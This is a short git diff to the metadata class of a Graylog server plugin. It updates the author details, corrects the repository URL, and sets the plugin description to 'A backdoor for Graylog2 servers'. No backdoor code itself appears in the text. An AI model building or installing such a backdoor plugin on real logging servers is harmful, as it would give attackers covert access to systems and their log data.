@@ -9,7 +9,8 @@ import java.util.Collections;
 import java.util.Set;
 
 /**
- * Implement the PluginMetaData interface here.
+ * Plugin metadata information
+ * @author Chris Vantine
  */
 public class FiftyShadesMetaData implements PluginMetaData {
     private static final String PLUGIN_PROPERTIES = "com.grayenterprise.graylog-plugin-fifty-shades/graylog-plugin.properties";
@@ -26,12 +27,12 @@ public class FiftyShadesMetaData implements PluginMetaData {
 
     @Override
     public String getAuthor() {
-        return "Chris Vantine <justchris.vantine@gmail.com>";
+        return "Chris Vantine <vantine@mail.rit.edu>";
     }
 
     @Override
     public URI getURL() {
-        return URI.create("https://github.com/https://github.com/Milkshak3s/graylog-plugin-fifty-shades.git");
+        return URI.create("https://github.com/Milkshak3s/50SHADES");
     }
 
     @Override
@@ -41,8 +42,7 @@ public class FiftyShadesMetaData implements PluginMetaData {
 
     @Override
     public String getDescription() {
-        // TODO Insert correct plugin description
-        return "Description of FiftyShades plugin";
+        return "A backdoor for Graylog2 servers";
     }
 
     @Override
